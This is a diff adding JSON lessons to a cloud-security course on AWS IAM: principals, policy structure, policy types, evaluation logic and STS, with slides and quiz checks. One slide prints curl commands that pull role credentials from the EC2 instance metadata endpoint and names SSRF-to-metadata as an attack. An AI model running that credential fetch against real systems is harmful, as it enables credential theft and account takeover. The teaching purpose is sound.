+                  "label": "Control: remove trust, fix PassRole, least privilege"
+                }
+              ],
+              "edges": [
+                {
+                  "from": "e1",
+                  "to": "c1",
+                  "label": "cut with"
+                },
+                {
+                  "from": "e2",
+                  "to": "c2",
+                  "label": "cut with"
+                }
+              ]
+            }
+          },
+          {
+            "title": "Why It Matters",
+            "body": "The attacker/defender dual reading is the capstone of module 1 and the working method for the whole course:\n\n- It unifies the module. 'What the cloud is' (APIs), 'shared responsibility' (your controls), 'service mapping' (the primitives), 'blast radius' (boundaries), 'threat landscape' (real paths), and 'the lab' (safe practice) all come together in reading one architecture two ways.\n- It is what professionals actually do. Threat modeling, cloud penetration tests, and secure architecture reviews are exactly this: enumerate identities and entry points, trace trust edges to data, and prescribe controls that cut the paths.\n- It makes defense concrete. 'Be secure' is useless; 'cut this specific edge with this specific control' is actionable. The paired reading forces that specificity.\n- It scales to tooling. Once you understand the manual graph, automated path-finders (Cartography, PMapper, Cloudsplaining, and commercial CSPM/CIEM tools) become amplifiers rather than black boxes.\n\nCarry the habit forward: whenever you meet a cloud system, map it as an attacker (reachable assets and trust edges to data), then as a defender (a control on each edge). That single reflex underlies every later module."
+          }
+        ]
+      }
+    ]
+  },
+  {
+    "id": "cloud-m2",
+    "name": "Cloud Identity & IAM Fundamentals",
+    "shortName": "IAM Foundations",
+    "month": 1,
+    "weeks": [
+      1
+    ],
+    "description": "Identity is the new perimeter, and IAM is the single most consequential system in the cloud. This module teaches the AWS IAM policy evaluation engine end to end — principals, policies, roles, trust, and the AssumeRole flow — because almost every cloud attack path is an identity path.",
+    "estimatedHours": 12,
+    "outcomes": [
+      "Read and write IAM policies and predict the allow/deny outcome using the full evaluation logic",
+      "Explain the difference between users, groups, roles, and the STS AssumeRole temporary-credential flow",
+      "Distinguish identity-based, resource-based, permission boundaries, SCPs and session policies",
+      "Identify over-permissioned principals and the classic wildcards that create privilege-escalation paths"
+    ],
+    "topics": [
+      {
+        "id": "cloud-m2-1",
+        "moduleId": "cloud-m2",
+        "number": 8,
+        "title": "Principals: Users, Groups, Roles",
+        "type": "theory",
+        "week": 1,
+        "description": "Defines who can act in an account. Emphasises that roles — not long-lived users — are the correct identity for workloads and cross-account access, and why temporary credentials beat access keys.",
+        "keyPoints": [
+          "IAM users (long-lived access keys) vs roles (assumed, temporary STS credentials)",
+          "Service roles, instance profiles, and roles for cross-account trust",
+          "Federated identity: SAML, OIDC, AWS IAM Identity Center (SSO)",
+          "Why long-lived access keys are the #1 leaked credential and should be minimised",
+          "Root account: lock it, MFA it, never use it operationally"
+        ],
+        "slides": [
+          {
+            "title": "Who Can Act: Principals",
+            "body": "A principal is any identity that can make a request to AWS. Think of your AWS account as an office building and IAM as the keycard system. A principal is anyone holding a keycard; IAM decides which doors each card opens.\n\nThere are three kinds of identity: users, groups, and roles. Getting these right is the foundation of cloud security, because almost every cloud attack path is really an identity path.\n\nJargon: IAM = Identity and Access Management, the AWS service that stores identities and the rules about what they can do."
+          },
+          {
+            "title": "Users vs Roles: The Core Split",
+            "body": "An IAM user is a long-lived identity with a permanent password and/or access keys. It is like a personal keycard that never expires until someone revokes it.\n\nA role is an identity with no permanent credentials. Instead, a trusted principal temporarily assumes it and receives short-lived keys that expire in minutes to hours. It is like a visitor badge you check out and hand back.\n\nThe modern rule: humans sign in through SSO and workloads use roles. Long-lived user access keys should be rare.",
+            "diagram": {
+              "type": "comparison",
+              "columns": [
+                {
+                  "label": "IAM User",
+                  "points": [
+                    "Permanent credentials (password, access keys)",
+                    "Keys start with AKIA",
+                    "Leaked key works until revoked",
+                    "Best for: almost nothing new today"
+                  ]
+                },
+                {
+                  "label": "IAM Role",
+                  "points": [
+                    "No permanent credentials",
+                    "Assumed to get temporary STS keys (ASIA)",
+                    "Keys auto-expire (15 min to 12 hr)",
+                    "Best for: workloads, SSO, cross-account"
+                  ],
+                  "highlighted": true
+                }
+              ]
+            }
+          },
+          {
+            "title": "How a Role Is Assumed",
+            "body": "A role is useless until something assumes it. The flow is always the same: a principal calls STS (Security Token Service) asking to assume the role. STS checks the role's trust policy to see if that principal is allowed. If yes, STS mints temporary credentials scoped to the role's permissions.\n\nThose temporary credentials carry an AccessKeyId, a SecretAccessKey, a SessionToken, and an expiry time. When they expire, they are dead.\n\nJargon: STS = the AWS service that vends temporary credentials.",
+            "diagram": {
+              "type": "flow-chain",
+              "steps": [
+                {
+                  "label": "Principal",
+                  "detail": "A user, service, or another role wants more access"
+                },
+                {
+                  "label": "sts:AssumeRole",
+                  "detail": "Calls STS naming the target role ARN"
+                },
+                {
+                  "label": "Trust check",
+                  "detail": "STS reads the role trust policy: is this caller allowed?"
+                },
+                {
+                  "label": "Temp credentials",
+                  "detail": "STS returns AccessKeyId + SecretAccessKey + SessionToken + expiry"
+                },
+                {
+                  "label": "Act as the role",
+                  "detail": "Caller now has the role's permissions until expiry"
+                }
+              ]
+            },
+            "check": {
+              "question": "Why is a role generally safer than an IAM user with access keys?",
+              "options": [
+                "Roles can do more actions than users",
+                "Role credentials are temporary and expire automatically, so a leaked key stops working",
+                "Roles are encrypted and users are not",
+                "Roles cannot be used by attackers at all"
+              ],
+              "correctIndex": 1,
+              "explanation": "The security win is lifetime. Assuming a role yields short-lived STS credentials that expire on their own. A leaked long-lived user access key keeps working until a human notices and revokes it."
+            }
+          },
+          {
+            "title": "Worked Example: EC2 Instance Profile",
+            "body": "A common real pattern: an EC2 server needs to read an S3 bucket. Instead of pasting access keys onto the box, you attach a role via an instance profile. The EC2 instance automatically gets fresh role credentials from the Instance Metadata Service (IMDS).\n\nAnything running on that instance can fetch those credentials. That convenience is also why SSRF-to-metadata (covered in a later module) is such a prized attack: reach the metadata endpoint and you inherit the role.",
+            "diagram": {
+              "type": "terminal",
+              "prompt": "$",
+              "lines": [
+                {
+                  "command": "curl http://169.254.169.254/latest/meta-data/iam/security-credentials/",
+                  "output": "s3-reader-role"
+                },
+                {
+                  "command": "curl http://169.254.169.254/latest/meta-data/iam/security-credentials/s3-reader-role",
+                  "output": "{\n  \"AccessKeyId\": \"ASIAEXAMPLE...\",\n  \"SecretAccessKey\": \"wJalr...\",\n  \"Token\": \"IQoJb3Jp...\",\n  \"Expiration\": \"2026-11-16T18:00:00Z\"\n}"
+                },
+                {
+                  "command": "# ASIA prefix + Expiration = temporary role credentials",
+                  "output": ""
+                }
+              ]
+            }
+          },
+          {
+            "title": "Groups and Federated Identity",
+            "body": "A group is just a container for users so you can attach one policy to many people (e.g. a 'Developers' group). Groups have no credentials and cannot be assumed; they only hold permissions.\n\nFederated identity lets outside identity systems map into AWS roles:\n- SAML and OIDC federate a corporate IdP or a CI system.\n- AWS IAM Identity Center (formerly AWS SSO) is the modern way to give humans role-based, temporary console and CLI access.\n\nWith federation, humans never need an IAM user at all."
+          },
+          {
+            "title": "Spotting the Danger: Long-Lived Keys",
+            "body": "Long-lived access keys (the AKIA prefix) are the single most leaked cloud credential. They show up in git history, CI logs, Docker images, and laptops.\n\nHow to spot risk in an account:\n- Users with active access keys, especially keys older than 90 days.\n- Keys that have never rotated.\n- The root account with access keys at all (it should have none).\n\nYou can list this quickly with the CLI and prioritize anything old or unused.",
+            "diagram": {
+              "type": "terminal",
+              "prompt": "$",
+              "lines": [
+                {
+                  "command": "aws iam list-access-keys --user-name deploy-bot",
+                  "output": "AccessKeyMetadata:\n- AccessKeyId: AKIAEXAMPLE123\n  Status: Active\n  CreateDate: '2023-02-01T10:00:00Z'"
+                },
+                {
+                  "command": "# A 2023 active AKIA key in 2026 = rotate or kill it",
+                  "output": ""
+                }
+              ]
+            }
+          },
+          {
+            "title": "Lab: AssumeRole Round-Trip",
+            "body": "In the module lab 'AssumeRole Round-Trip' you make this concrete:\n1. Create a role with a trust policy naming a second principal.\n2. From that principal, run aws sts assume-role and capture the temporary credentials.\n3. Export them and run aws sts get-caller-identity to confirm you are now the role.\n4. Prove the limits: try an action the role lacks and watch it get denied.\n\nThis single exercise cements the whole user-vs-role mental model better than any diagram."
+          },
+          {
+            "title": "Harden the Root, and Why It Matters",
+            "body": "The root account owns everything and cannot be scoped by policy. Lock it: enable MFA, delete any root access keys, and never use it for daily work. Create roles and SSO users for operations.\n\nWhy it matters: identity is the new perimeter. If principals are sloppy — standing keys, an unprotected root, humans using IAM users instead of SSO — an attacker who grabs one credential can often walk the whole account. Clean principal design shrinks the blast radius before any policy is even written.",
+            "diagram": {
+              "type": "flow-chain",
+              "steps": [
+                {
+                  "label": "Root locked",
+                  "detail": "MFA on, no access keys, unused"
+                },
+                {
+                  "label": "Humans via SSO",
+                  "detail": "IAM Identity Center, temporary creds"
+                },
+                {
+                  "label": "Workloads via roles",
+                  "detail": "Instance profiles, service roles"
+                },
+                {
+                  "label": "Minimal users",
+                  "detail": "Rare, rotated keys only where unavoidable"
+                }
+              ]
+            }
+          }
+        ]
+      },
+      {
+        "id": "cloud-m2-2",
+        "moduleId": "cloud-m2",
+        "number": 9,
+        "title": "Anatomy of an IAM Policy",
+        "type": "theory",
+        "week": 1,
+        "description": "Dissects the JSON policy document field by field. Students learn Effect, Action, Resource, Condition and Principal, and how NotAction/NotResource invert matching in dangerous ways.",
+        "keyPoints": [
+          "Effect / Action / Resource / Condition / Principal structure",
+          "Wildcards: Action '*' and Resource '*' and why they're the root of most escalations",
+          "Condition keys (aws:SourceIp, aws:PrincipalOrgID, aws:MultiFactorAuthPresent)",
+          "NotAction / NotResource gotchas and deny-by-default semantics",
+          "ARNs: parsing and pattern-matching resource identifiers"
+        ],
+        "slides": [
+          {
+            "title": "What an IAM Policy Is",
+            "body": "An IAM policy is a JSON document that lists rules about who can do what to which resources, under what conditions. It is the actual law the evaluation engine enforces.\n\nAnalogy: a policy is a guest list with fine print. 'Allow Dana to open the east door, but only on weekdays, and only from the office network.' Every word in that sentence maps to a field in the JSON.\n\nIf you can read and write these documents fluently, you can predict access outcomes and spot the mistakes attackers hunt for."
+          },
+          {
+            "title": "The Building Blocks",
+            "body": "Every statement in a policy is built from a small set of fields:\n- Effect: Allow or Deny.\n- Action: the API operations, e.g. s3:GetObject.\n- Resource: which ARNs the actions apply to.\n- Condition: optional extra tests that must be true.\n- Principal: who the statement applies to (used only in resource-based policies).\n\nA policy is just a list of these statements. The engine checks all of them together.",
+            "diagram": {
+              "type": "graph-tree",
+              "nodes": [
+                {
+                  "id": "stmt",
+                  "label": "Statement",
+                  "highlighted": true
+                },
+                {
+                  "id": "eff",
+                  "label": "Effect: Allow/Deny"
+                },
+                {
+                  "id": "act",
+                  "label": "Action: s3:GetObject"
+                },
+                {
+                  "id": "res",
+                  "label": "Resource: arn:aws:s3:::reports/*"
+                },
+                {
+                  "id": "cond",
+                  "label": "Condition: IP, MFA, Org"
+                },
+                {
+                  "id": "prin",
+                  "label": "Principal (resource policies)"
+                }
+              ],
+              "edges": [
+                {
+                  "from": "stmt",
+                  "to": "eff",
+                  "label": "has"
+                },
+                {
+                  "from": "stmt",
+                  "to": "act",
+                  "label": "has"
+                },
+                {
+                  "from": "stmt",
+                  "to": "res",
+                  "label": "has"
+                },
+                {
+                  "from": "stmt",
+                  "to": "cond",
+                  "label": "optional"
+                },
+                {
+                  "from": "stmt",
+                  "to": "prin",
+                  "label": "optional"
+                }
+              ]
+            }
+          },
+          {
+            "title": "Reading a Real Policy",
+            "body": "Here is a least-privilege identity policy. It allows reading objects from one bucket, and only when the caller used MFA. Read it field by field: Effect allows, Action is the read operation, Resource is one bucket's objects, Condition requires MFA.\n\nThis is what 'scoped' looks like: a specific action on a specific resource with a guardrail.",
+            "diagram": {
+              "type": "terminal",
+              "prompt": "$",
+              "lines": [
+                {
+                  "command": "cat read-reports.json",
+                  "output": "{\n  \"Version\": \"2012-10-17\",\n  \"Statement\": [{\n    \"Effect\": \"Allow\",\n    \"Action\": \"s3:GetObject\",\n    \"Resource\": \"arn:aws:s3:::reports/*\",\n    \"Condition\": {\n      \"Bool\": {\"aws:MultiFactorAuthPresent\": \"true\"}\n    }\n  }]\n}"
+                }
+              ]
+            },
+            "check": {
+              "question": "In the policy above, can the principal call s3:PutObject on the reports bucket?",
+              "options": [
+                "Yes, read access implies write access",
+                "No. Only s3:GetObject is allowed, and anything not explicitly allowed is denied",
+                "Yes, but only with MFA",
+                "Only if the bucket policy also allows it"
+              ],
+              "correctIndex": 1,
+              "explanation": "IAM is default-deny. The statement only allows s3:GetObject, so PutObject has no matching Allow and is denied. The MFA condition applies solely to the allowed read."
+            }
+          },
+          {
+            "title": "Wildcards: Where Escalations Begin",
+            "body": "Two wildcards cause most real privilege-escalation findings:\n- Action: '*' means every API operation.\n- Resource: '*' means every resource.\n\nAn identity policy with Effect Allow, Action '*', Resource '*' is AdministratorAccess. Attackers grep for exactly this. Even partial wildcards like iam:* or s3:* are dangerous because they bundle sensitive write and permission-changing actions.\n\nThe habit to build: treat every '*' as a question — does this principal truly need all of it?",
+            "diagram": {
+              "type": "comparison",
+              "columns": [
+                {
+                  "label": "Dangerous",
+                  "points": [
+                    "Action: \"*\"  Resource: \"*\"",
+                    "iam:* (can rewrite permissions)",
+                    "s3:* on all buckets",
+                    "Reads like 'admin'"
+                  ]
+                },
+                {
+                  "label": "Scoped",
+                  "points": [
+                    "Action: \"s3:GetObject\"",
+                    "Resource: one bucket ARN",
+                    "Condition: MFA / source IP",
+                    "Reads like a single job"
+                  ],
+                  "highlighted": true
+                }
+              ]
+            }
+          },
+          {
+            "title": "Condition Keys: The Guardrails",
+            "body": "Conditions add tests that must pass for a statement to apply. They turn a broad grant into a safe one. Common keys:\n- aws:SourceIp — only from certain networks.\n- aws:MultiFactorAuthPresent — only with MFA.\n- aws:PrincipalOrgID — only principals in your AWS Organization.\n- aws:PrincipalTag / aws:ResourceTag — attribute-based access control.\n\nConditions are also a frequent bypass target: a missing or weak condition (like no ExternalId on a cross-account role) is exactly what an attacker exploits."
+          },
+          {
+            "title": "The NotAction / NotResource Trap",
+            "body": "NotAction and NotResource invert the match: they mean 'everything except this.' They are rarely needed and easy to get catastrophically wrong.\n\nAllow + NotAction: 's3:DeleteBucket' does NOT mean 'allow S3 except delete.' It means 'allow every AWS action except s3:DeleteBucket' — effectively near-admin. Combined with Resource '*', it is an accidental god-mode grant.\n\nRule of thumb: prefer explicit Action lists. If you see NotAction in an Allow statement, stop and audit it carefully.",
+            "diagram": {
+              "type": "comparison",
+              "columns": [
+                {
+                  "label": "Allow + Action list",
+                  "points": [
+                    "Grants exactly the listed actions",
+                    "Easy to reason about",
+                    "Default-deny does the rest"
+                  ],
+                  "highlighted": true
+                },
+                {
+                  "label": "Allow + NotAction",
+                  "points": [
+                    "Grants EVERYTHING except the listed actions",
+                    "Usually far broader than intended",
+                    "Classic accidental admin"
+                  ]
+                }
+              ]
+            }
+          },
+          {
+            "title": "Parsing ARNs",
+            "body": "An ARN (Amazon Resource Name) uniquely identifies a resource. Learning its shape lets you write tight Resource fields and recognize what a policy really grants.\n\nFormat: arn:partition:service:region:account-id:resource. Some services leave region or account blank (like S3 bucket ARNs). Policies pattern-match ARNs with wildcards, so arn:aws:s3:::reports/* means every object in the reports bucket, while arn:aws:s3:::* means every bucket in the partition.",
+            "diagram": {
+              "type": "terminal",
+              "prompt": "$",
+              "lines": [
+                {
+                  "command": "echo arn:aws:iam::123456789012:role/deploy",
+                  "output": "partition=aws  service=iam  region=(none)\naccount=123456789012  resource=role/deploy"
+                },
+                {
+                  "command": "echo arn:aws:s3:::reports/2026/q3.csv",
+                  "output": "service=s3  region=(none)  account=(none)\nresource=reports/2026/q3.csv"
+                }
+              ]
+            }
+          },
+          {
+            "title": "Why Policy Literacy Matters",
+            "body": "Nearly every cloud breach report includes an over-broad policy somewhere in the chain. The attacker did not break cryptography — they found Action '*', a missing condition, or a careless NotAction.\n\nIf you can read a policy and instantly see 'this is admin,' 'this has no MFA guard,' or 'this trusts the whole internet,' you can both find the bug as an attacker and fix it as a defender. This single skill underpins every offensive and defensive module that follows."
+          }
+        ]
+      },
+      {
+        "id": "cloud-m2-3",
+        "moduleId": "cloud-m2",
+        "number": 10,
+        "title": "Policy Types & Their Interaction",
+        "type": "theory",
+        "week": 1,
+        "description": "The hardest part of IAM: five policy types evaluated together. Covers identity-based, resource-based, permission boundaries, SCPs and session policies and the order of precedence.",
+        "keyPoints": [
+          "Identity-based (attached to principal) vs resource-based (attached to the resource, e.g. S3 bucket policy)",
+          "Permission boundaries cap the max a principal can do",
+          "Service Control Policies (SCPs) as org-wide guardrails that cannot grant, only restrict",
+          "Session policies passed at AssumeRole time further narrow a session",
+          "Resource-based policies enable cross-account access without AssumeRole"
+        ],
+        "slides": [
+          {
+            "title": "Five Policies, One Decision",
+            "body": "Access in AWS is rarely decided by a single policy. Up to five different policy types can apply to one request at the same time. This is the hardest part of IAM and where many mistakes hide.\n\nAnalogy: entering a secure building, several checks stack up — the company-wide rule (SCP), the door's own lock (resource policy), your personal keycard limits (identity policy and boundary), and any temporary visitor restriction (session policy). All must agree before you pass.\n\nThis module teaches each type and how they combine."
+          },
+          {
+            "title": "Identity-Based vs Resource-Based",
+            "body": "The two most common types answer the question from opposite ends:\n- Identity-based policies attach to a principal (user, group, role) and say what that principal can do.\n- Resource-based policies attach to a resource (an S3 bucket, a Lambda, a KMS key) and say who can touch it, naming a Principal.\n\nBecause a resource-based policy names the caller directly, it can grant cross-account access without the caller assuming any role.",
+            "diagram": {
+              "type": "comparison",
+              "columns": [
+                {
+                  "label": "Identity-based",
+                  "points": [
+                    "Attached to a user/role",
+                    "Answers: what can THIS principal do?",
+                    "No Principal field",
+                    "Most IAM policies"
+                  ],
+                  "highlighted": true
+                },
+                {
+                  "label": "Resource-based",
+                  "points": [
+                    "Attached to a resource",
+                    "Answers: who can touch THIS resource?",
+                    "Has a Principal field",
+                    "e.g. S3 bucket policy, KMS key policy"
+                  ]
+                }
+              ]
+            }
+          },
+          {
+            "title": "Permission Boundaries: The Ceiling",
+            "body": "A permission boundary is an identity policy that sets the maximum a principal can ever do — it grants nothing by itself. The effective permissions are the intersection of the boundary and the principal's identity policies.\n\nAnalogy: the identity policy is what your keycard tries to open; the boundary is the floor plan of doors that physically exist. If a door is not in both, you cannot open it.\n\nBoundaries are how you safely let developers create roles without letting those roles exceed a cap.",
+            "diagram": {
+              "type": "flow-chain",
+              "steps": [
+                {
+                  "label": "Identity policy",
+                  "detail": "Grants s3:*, iam:*, ec2:*"
+                },
+                {
+                  "label": "Permission boundary",
+                  "detail": "Caps to s3:* only"
+                },
+                {
+                  "label": "Intersection",
+                  "detail": "Effective = s3:* (iam and ec2 dropped)"
+                }
+              ]
+            }
+          },
+          {
+            "title": "SCPs: Org-Wide Guardrails",
+            "body": "Service Control Policies apply across an AWS Organization, to whole accounts or organizational units. A crucial rule: SCPs can only restrict, never grant. They set the outer boundary for every principal in an account, including (with limits) what roles can do.\n\nExample: an SCP that denies any action outside the eu-west-1 region means no principal in that account — however powerful their identity policy — can act elsewhere. SCPs are the enterprise safety net above individual IAM.",
+            "diagram": {
+              "type": "graph-tree",
+              "nodes": [
+                {
+                  "id": "org",
+                  "label": "Organization root",
+                  "highlighted": true
+                },
+                {
+                  "id": "ou",
+                  "label": "OU: Production"
+                },
+                {
+                  "id": "acct",
+                  "label": "Account 123..."
+                },
+                {
+                  "id": "scp",
+                  "label": "SCP: deny non-eu-west-1"
+                }
+              ],
+              "edges": [
+                {
+                  "from": "org",
+                  "to": "ou",
+                  "label": "contains"
+                },
+                {
+                  "from": "ou",
+                  "to": "acct",
+                  "label": "contains"
+                },
+                {
+                  "from": "scp",
+                  "to": "acct",
+                  "label": "restricts all principals"
+                }
+              ]
+            }
+          },
+          {
+            "title": "Session Policies: Narrow on the Fly",
+            "body": "When you assume a role, you can pass a session policy inline. It further narrows that one session — it cannot expand beyond the role's own permissions.\n\nUse case: a service assumes a powerful role but passes a session policy limiting the session to a single customer's resources. This is the backbone of multi-tenant isolation: one role, many tightly scoped sessions. Like a boundary, a session policy only intersects down, never adds.",
+            "check": {
+              "question": "You assume a role that allows s3:* and pass a session policy allowing only s3:GetObject. What can the session do?",
+              "options": [
+                "s3:* — session policies are ignored",
+                "Only s3:GetObject — the session is the intersection, which can only narrow",
+                "ec2:* as well, because session policies add permissions",
+                "Nothing, because two policies conflict"
+              ],
+              "correctIndex": 1,
+              "explanation": "Session policies can only narrow. The effective permission is the intersection of the role's s3:* and the session's s3:GetObject, leaving just s3:GetObject."
+            }
+          },
+          {
+            "title": "Resource Policies: Cross-Account Doors",
+            "body": "Resource-based policies deserve special attention because they open cross-account access without AssumeRole. An S3 bucket policy can name a principal in a totally different account and grant it read access directly.\n\nThat is powerful and risky. A bucket policy with Principal '*' makes the bucket world-accessible. Many public-data leaks are simply an over-broad resource policy. When threat-modeling, always read resource policies, not just identity policies — the grant may live on the resource.",
+            "diagram": {
+              "type": "request-response",
+              "leftLabel": "Account B principal",
+              "rightLabel": "Account A S3 bucket",
+              "exchanges": [
+                {
+                  "direction": "right",
+                  "label": "GetObject (no role assumed)",
+                  "payload": "arn:aws:s3:::acct-a-data/secret.txt"
+                },
+                {
+                  "direction": "left",
+                  "label": "200 OK — bucket policy allows Principal acct-B",
+                  "payload": "secret.txt contents"
+                }
+              ]
+            }
+          },
+          {
+            "title": "How They Combine",
+            "body": "For a single request, think of it as layers, each able to block:\n1. SCP — allowed by the org guardrail?\n2. Resource policy — does the resource permit this principal?\n3. Permission boundary — within the cap?\n4. Session policy — within the assumed-session narrowing?\n5. Identity policy — explicitly allowed?\n\nAn explicit Deny anywhere wins instantly. For an Allow, the required layers must all agree. The next topic walks the exact official order.",
+            "diagram": {
+              "type": "flow-chain",
+              "steps": [
+                {
+                  "label": "SCP",
+                  "detail": "Org guardrail — restrict only"
+                },
+                {
+                  "label": "Resource policy",
+                  "detail": "Who the resource trusts"
+                },
+                {
+                  "label": "Boundary",
+                  "detail": "Principal's ceiling"
+                },
+                {
+                  "label": "Session policy",
+                  "detail": "Per-session narrowing"
+                },
+                {
+                  "label": "Identity policy",
+                  "detail": "The explicit grant"
+                }
+              ]
+            }
+          },
+          {
+            "title": "Why Interaction Is Where Bugs Live",
+            "body": "Each policy type alone is simple. The security-relevant mistakes come from their interaction: an identity policy that looks fine but is quietly widened by a resource policy, or a boundary everyone forgot to attach, or an SCP exception that re-opens a region.\n\nAttackers map all five layers to find the one that is missing or misconfigured. Defenders must reason about the whole stack, not one JSON file. Mastering interaction is what separates someone who can read a policy from someone who can secure an account."
+          }
+        ]
+      },
+      {
+        "id": "cloud-m2-4",
+        "moduleId": "cloud-m2",
+        "number": 11,
+        "title": "IAM Policy Evaluation Logic",
+        "type": "theory",
+        "week": 1,
+        "description": "Walks the official decision flow: explicit deny wins, then SCPs, boundaries, session policies and allow checks. Students trace a request to a verdict step by step.",
+        "keyPoints": [
+          "Explicit deny always wins, everywhere, immediately",
+          "Default deny: no matching allow = denied",
+          "Evaluation order across SCP -> resource policy -> boundary -> session -> identity policy",
+          "Same-account vs cross-account evaluation differences",
+          "Using the IAM Policy Simulator and 'aws iam simulate-principal-policy' to predict outcomes"
+        ],
+        "slides": [
+          {
+            "title": "The Decision Engine",
+            "body": "Every AWS request runs through one deterministic decision engine. Given the request and all applicable policies, it returns exactly Allow or Deny. No randomness, no 'it depends' — if you know the policies, you can predict the verdict.\n\nAnalogy: a strict bouncer with a checklist. One failed check and you are out; otherwise you must satisfy every required list to get in.\n\nLearning this flow lets you trace any request to its answer and prove why an attack does or does not work."
+          },
+          {
+            "title": "Rule One: Explicit Deny Always Wins",
+            "body": "The most important rule: an explicit Deny anywhere — in any policy type — immediately denies the request. Nothing can override it. No Allow, however broad, can win against a Deny.\n\nThis is why Deny statements are a powerful defensive tool: an SCP that denies s3:DeleteBucket shuts that action for everyone in the account, even administrators. When you see unexpected access blocked, hunt for the explicit Deny first.",
+            "diagram": {
+              "type": "flow-chain",
+              "steps": [
+                {
+                  "label": "Request arrives",
+                  "detail": "e.g. s3:DeleteBucket on prod-logs"
+                },
+                {
+                  "label": "Any explicit Deny?",
+                  "detail": "Scan every applicable policy"
+                },
+                {
+                  "label": "Yes -> DENY",
+                  "detail": "Stops immediately, overrides all Allows"
+                },
+                {
+                  "label": "No -> keep evaluating",
+                  "detail": "Move on to Allow checks"
+                }
+              ]
+            },
+            "check": {
+              "question": "An identity policy allows s3:* but an SCP explicitly denies s3:DeleteBucket. Can the principal delete a bucket?",
+              "options": [
+                "Yes, the identity Allow wins",
+                "No, an explicit Deny anywhere overrides any Allow",
+                "Only if they also have MFA",
+                "Only in the same account"
+              ],
+              "correctIndex": 1,
+              "explanation": "Explicit Deny always wins. The SCP Deny on s3:DeleteBucket overrides the s3:* Allow, so deletion is blocked for everyone it covers."
+            }
+          },
+          {
+            "title": "Rule Two: Default Deny",
+            "body": "If no statement explicitly allows the request, it is denied. AWS grants nothing by default. This is why a brand-new IAM user with no policies can do literally nothing.\n\nSo a request is allowed only when: there is no explicit Deny, AND at least one Allow matches, AND every required guardrail layer also permits it. Absence of a rule is never permission."
+          },
+          {
+            "title": "The Full Evaluation Order",
+            "body": "The official logic, in order, for a request:\n1. Evaluate all applicable policies for an explicit Deny — if found, DENY.\n2. SCPs (if in an Organization) must allow the action.\n3. Resource-based policy — may itself provide the Allow.\n4. Permission boundary must allow.\n5. Session policy must allow.\n6. Identity-based policy must allow.\n\nFor same-account requests, a resource policy or an identity policy providing the Allow is often enough. The required layers differ slightly for cross-account, covered next.",
+            "diagram": {
+              "type": "flow-chain",
+              "steps": [
+                {
+                  "label": "1. Explicit Deny?",
+                  "detail": "Anywhere -> DENY now"
+                },
+                {
+                  "label": "2. SCP allows?",
+                  "detail": "Org guardrail"
+                },
+                {
+                  "label": "3. Resource policy",
+                  "detail": "May grant the Allow"
+                },
+                {
+                  "label": "4. Boundary allows?",
+                  "detail": "Within the cap"
+                },
+                {
+                  "label": "5. Session allows?",
+                  "detail": "Within the session"
+                },
+                {
+                  "label": "6. Identity allows?",
+                  "detail": "Explicit grant -> ALLOW"
+                }
+              ]
+            }
+          },
+          {
+            "title": "Same-Account vs Cross-Account",
+            "body": "Same-account: either an identity policy OR a resource policy granting access is sufficient (plus no Deny and SCP/boundary pass). The two can even complement each other.\n\nCross-account: access needs an Allow on BOTH sides. The resource's account must allow the external principal (via resource policy or by being assumable), AND the caller's own identity policy must allow the action. Both accounts must agree — a frequent source of 'why is this denied?' confusion.",
+            "diagram": {
+              "type": "comparison",
+              "columns": [
+                {
+                  "label": "Same account",
+                  "points": [
+                    "Identity policy OR resource policy can grant",
+                    "They can complement each other",
+                    "One sufficient Allow is enough"
+                  ]
+                },
+                {
+                  "label": "Cross account",
+                  "points": [
+                    "BOTH sides must allow",
+                    "Resource account trusts the caller",
+                    "Caller's identity policy allows the action"
+                  ],
+                  "highlighted": true
+                }
+              ]
+            }
+          },
+          {
+            "title": "Worked Example: Simulate Before You Guess",
+            "body": "You do not have to trace by hand. The IAM Policy Simulator and the simulate-principal-policy API evaluate the real policies and tell you the verdict, including which statement was decisive.\n\nThis is the fastest way to confirm an escalation path ('can this role call iam:PutUserPolicy?') or to verify a fix. It evaluates identity policies, boundaries, and (with inputs) resource context.",
+            "diagram": {
+              "type": "terminal",
+              "prompt": "$",
+              "lines": [
+                {
+                  "command": "aws iam simulate-principal-policy \\\n  --policy-source-arn arn:aws:iam::111122223333:role/dev \\\n  --action-names iam:PutUserPolicy s3:GetObject",
+                  "output": "EvaluationResults:\n- EvalActionName: iam:PutUserPolicy\n  EvalDecision: implicitDeny\n- EvalActionName: s3:GetObject\n  EvalDecision: allowed"
+                }
+              ]
+            }
+          },
+          {
+            "title": "Lab: Policy Evaluation Gauntlet",
+            "body": "The module lab 'Policy Evaluation Gauntlet' is pure reps on this skill. You are given stacked identity, resource, boundary and SCP policies and must predict every allow/deny verdict before checking yourself in the IAM Policy Simulator.\n\nDo it slowly: for each request, ask the six questions in order. Explicit Deny? SCP? Resource? Boundary? Session? Identity? Write down the deciding layer. When your predictions match the simulator consistently, you have internalized the engine."
+          },
+          {
+            "title": "Why Tracing Verdicts Matters",
+            "body": "Offensively, you prove an attack path is real by showing the engine will allow it. Defensively, you prove a control works by showing the engine denies the abuse. Both come down to tracing the request through this exact flow.\n\nAlso decode denials properly: aws sts decode-authorization-message turns an encoded 'access denied' blob into the actual reason. Reading verdicts — and the engine behind them — is the literacy every later cloud-attack module assumes you already have.",
+            "diagram": {
+              "type": "terminal",
+              "prompt": "$",
+              "lines": [
+                {
+                  "command": "aws sts decode-authorization-message --encoded-message <blob>",
+                  "output": "{\n  \"allowed\": false,\n  \"explicitDeny\": true,\n  \"matchedStatements\": [{\"Sid\": \"DenyOutsideRegion\"}]\n}"
+                }
+              ]
+            }
+          }
+        ]
+      },
+      {
+        "id": "cloud-m2-5",
+        "moduleId": "cloud-m2",
+        "number": 12,
+        "title": "STS & the AssumeRole Flow",
+        "type": "lab",
+        "week": 1,
+        "description": "Hands-on with the Security Token Service, the beating heart of cloud identity. Students mint temporary credentials, inspect them, and understand role chaining and external IDs.",
+        "keyPoints": [
+          "sts:AssumeRole, AssumeRoleWithSAML, AssumeRoleWithWebIdentity",
+          "Trust policy (who may assume) vs permission policy (what the role can do)",
+          "Temporary credentials: AccessKeyId, SecretAccessKey, SessionToken, expiry",
+          "Role chaining and the 1-hour chaining limit; ExternalId to prevent confused-deputy",
+          "Decoding a session with 'aws sts get-caller-identity' and 'aws sts decode-authorization-message'"
+        ],
+        "slides": [
+          {
+            "title": "STS: The Temporary-Credential Engine",
